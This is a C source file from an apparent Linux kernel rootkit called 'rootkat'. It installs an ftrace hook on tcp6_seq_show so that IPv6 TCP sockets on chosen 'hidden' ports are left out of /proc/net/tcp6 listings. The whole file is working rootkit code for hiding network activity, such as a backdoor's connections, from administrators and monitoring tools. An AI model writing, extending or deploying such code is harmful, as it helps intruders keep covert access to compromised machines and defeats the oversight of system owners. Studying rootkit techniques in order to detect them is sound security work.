// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/seq_file.h>
#include <net/sock.h>
#include "ftrace_hook.h"
#include "hidden_ports.h"
#include "hook_tcp6_seq_show.h"

#define TAG "rootkat/hook_tcp6_seq_show: "

static const char * const tcp6_seq_show_candidates[] = {
	"tcp6_seq_show", NULL,
};

typedef int (*tcp6_seq_show_t)(struct seq_file *seq, void *v);

static int rootkat_tcp6_seq_show(struct seq_file *seq, void *v);

static struct rootkat_hook hook_tcp6_seq_show = {
	.candidates  = tcp6_seq_show_candidates,
	.replacement = rootkat_tcp6_seq_show,
};

/* sk_num is at the same sock_common offset for IPv4 and IPv6 sockets,
 * so the filter is identical to the v4 version. */
static int rootkat_tcp6_seq_show(struct seq_file *seq, void *v)
{
	tcp6_seq_show_t orig = (tcp6_seq_show_t)hook_tcp6_seq_show.original;

	if (v != SEQ_START_TOKEN) {
		struct sock *sk = (struct sock *)v;

		if (rootkat_is_port_hidden(sk->sk_num))
			return 0;
	}

	return orig(seq, v);
}

int rootkat_hook_tcp6_seq_show_install(void)
{
	return rootkat_hook_install(&hook_tcp6_seq_show);
}

void rootkat_hook_tcp6_seq_show_remove(void)
{
	rootkat_hook_remove(&hook_tcp6_seq_show);
}
